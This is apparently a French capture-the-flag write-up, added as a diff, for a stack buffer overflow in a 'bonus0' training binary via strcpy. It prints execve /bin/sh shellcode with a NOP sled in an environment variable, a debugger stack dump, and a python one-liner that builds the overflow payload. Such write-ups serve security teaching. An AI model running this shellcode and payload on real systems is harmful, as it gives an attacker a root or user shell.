@@ -1,0 +1,37 @@
+Dans cette exercice il faut exploiter la vulnerabilite de strcpy qui permet de creer
+un bufferoverflow si la destination < source
+
+nous allons passer par un shellcode stocké dans une variables d'environnement.
+
+export SHELLCODE=`python -c 'print "\x90"*80 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
+
+(le nop * 80 sert a avoir une large plage pour qu'on jump dedans)
+
+sous peda on peut voir l'adresse du SHELLCODE ajouter dans les variables d'environnement
+
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6a8 --> 0x0
+0004| 0xbffff6ac --> 0xb7e454d3 (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)
+0008| 0xbffff6b0 --> 0x2
+0012| 0xbffff6b4 --> 0xbffff744 --> 0xbffff867 ("/home/user/bonus0/bonus0")
+0016| 0xbffff6b8 --> 0xbffff750 --> 0xbffff885 ("SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀")
+0020| 0xbffff6bc --> 0xb7fdc858 --> 0xb7e2c000 --> 0x464c457f
+0024| 0xbffff6c0 --> 0x0
+0028| 0xbffff6c4 --> 0xbffff71c --> 0x8048421 (<_start+33>:	hlt)
+[------------------------------------------------------------------------------]
+
+On va remplir le premiere argument de la taille maximale du read, cad 4096 - 1
+afin de pouvoir ajouter un '\n' qui indiquera que nous passons au deuxieme argument
+
+on utilise le buffer overflow string generator en 2eme argument afin de definir
+l'offset qui nous fera atteindre la stack afin d'injecter l'adresse du shellcode
+qui sera la prochaine instruction a executer. l'offset est de 9
+
+0xbffff885 est l'adresse de SHELLCODE.
+il faut incrementer l'adresse de 20 minmimum car celle ci pointe sur le mot "SHELLCODE="
+et non pas sur le shellcode lui meme.
+Apres ca on atterit bien dans la plage des nop. Il faut egalement faire en sorte
+que cette string contienne 20 caracteres minmimum, il faut ajouter au moins 7 char
+a la fin afin d'empecher le strncpy de copier une string avec un '\0'.
+
+python -c 'print "A"*4095 + "\n" + "B" * 9 + "\x9a\xf8\xff\xbf" + "C" * 7' > /tmp/exploit
